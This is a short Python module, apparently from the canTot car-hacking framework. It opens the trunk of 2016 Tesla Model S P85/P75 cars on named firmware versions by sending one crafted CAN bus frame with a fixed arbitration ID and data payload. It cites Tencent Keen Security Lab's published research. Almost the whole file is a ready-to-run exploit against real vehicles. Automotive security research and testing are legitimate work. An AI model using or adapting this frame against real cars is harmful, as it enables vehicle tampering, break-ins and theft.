from sploitkit import *
import can
import time

class tesla_open_trunk(Module):
    """ This module will open a trunk on a Tesla Model S P85 and P75 in 2016(v7.1(2.28.60) and v7.1(2.32.23)).

    Author:  shipcod3 # canTot module
    Credits: {snie, dlingliu, davendu}@tencent.com [Keen Security Lab of Tencent]
    Reference: https://www.blackhat.com/docs/us-17/thursday/us-17-Nie-Free-Fall-Hacking-Tesla-From-Wireless-To-CAN-Bus-wp.pdf
    Version: 1.0
    """
    config = Config({
        Option(
            'INTERFACE',
            "CAN interface",
            True,
        ): str("vcan0"),
    })    
    def run(self):
        bus = can.interface.Bus(bustype="socketcan", channel=self.config.option('INTERFACE').value)
        try:
            print("[+] Opening the trunk")
            trunk = can.Message(arbitration_id=0x0248, data=[0x04,0x00,0x30,0x07,0x00,0xFF,0xFF,0x00], is_extended_id=False)
            bus.send(trunk)
        except:
            print("[-] Attack failed!")
